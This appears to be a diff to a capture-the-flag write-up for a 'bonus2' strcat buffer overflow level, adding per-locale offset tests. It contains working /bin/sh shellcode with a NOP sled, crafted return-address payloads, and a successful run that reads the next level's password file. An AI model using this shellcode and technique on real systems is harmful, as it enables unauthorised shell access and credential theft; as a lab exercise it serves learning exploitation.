@@ -43,12 +43,45 @@ conclusion :
 ## Buffer overflow : strcat exploit
 
 - find the correct length of the first parameter to overwrite all '/0' until the second parameter => `40`
+- use the correct language : environment LANG (en, fi or nl)
 - use the second parameter to launch the shellcode
-    - find the offset => `26`
-    - get the shellcode address => `0xbffff832`
 ```
 $ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
-$ /tmp/a.out
-0xbffff832
-$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 26 + "\x32\xf8\xff\xbf"')
 ```
+
+## Test language = 0
+- find the offset => `26`
+```
+$ /tmp/a.out
+0xbffff83f
+$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 26 + "\x3f\xf8\xff\xbf"')
+Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB?���
+Segmentation fault (core dumped)
+```
+failed !
+
+## Test language = 1
+- find the offset => `14`
+
+```
+$ export LANG=fi
+$ /tmp/a.out
+0xbffff848
+$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 14 + "\x48\xf8\xff\xbf"')
+Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBH���
+Segmentation fault (core dumped)
+```
+failed !
+
+## Test language = 2
+- find the offset => `23`
+```
+$ export LANG=nl
+$ /tmp/a.out
+0xbffff848
+$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 23 + "\x48\xf8\xff\xbf"')
+Goedemiddag! BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBH���
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+success !
